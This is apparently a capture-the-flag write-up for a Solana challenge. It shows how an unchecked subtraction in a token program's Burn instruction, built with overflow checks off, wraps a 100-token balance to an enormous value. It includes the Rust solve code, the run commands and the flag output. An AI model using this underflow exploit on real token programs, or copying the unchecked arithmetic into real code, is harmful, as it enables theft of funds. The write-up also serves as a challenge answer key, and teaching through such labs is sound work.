# Token Overflow

**Category:** Blockchain (Solana)  **Difficulty:** Medium  **Author:** AbuCTF

> A simple token program allows users to mint, burn, and transfer tokens. Players start with 100 tokens and must acquire at least 1,000,000 tokens to capture the flag.

Handout: `dist/` (program and server source, empty `solve/` template, Dockerfile). Run: `cd challenge && docker compose up --build`, then connect to port 5004.

## Solution

The server spins up a fresh instance, gives you a token account with 100 tokens and asks for a solve program (`.so`) that it runs once. The win check is just `balance >= 1_000_000`.

`Transfer` checks `balance >= amount` before subtracting. `Burn` doesn't:

```rust
token_data.balance -= amount;
```

and the program's `Cargo.toml` sets `overflow-checks = false` for release builds, so that subtraction wraps instead of panicking. Burn 200 when you hold 100 and the balance becomes `100 - 200 = 18446744073709551516`.

So the solve program just CPIs into the token program with `Burn { amount: 200 }`, passing our token account and our signer (`solve/src/processor.rs`):

```rust
let ix = Instruction {
    program_id: *token_program.key,
    accounts: vec![
        AccountMeta::new(*user_token_account.key, false),
        AccountMeta::new(*user_account.key, true),
    ],
    data: TokenInstruction::Burn { amount: 200 }.try_to_vec().unwrap(),
};
invoke(&ix, &[user_token_account.clone(), user_account.clone()])?;
```

Build it and send it with `solve.py`, which parses the addresses out of the banner and passes them as accounts:

```bash
./build.sh
python3 solve.py <host> 5004
```

```
Program log: Burned 200 tokens. New balance: 18446744073709551516
[+] Flag: H7CTF{1nt3ger_und3rf10w_1n_th1s_d4y_and_ag3_<uuid>}
```

Flag is per instance: `H7CTF{1nt3ger_und3rf10w_1n_th1s_d4y_and_ag3_<uuid>}`
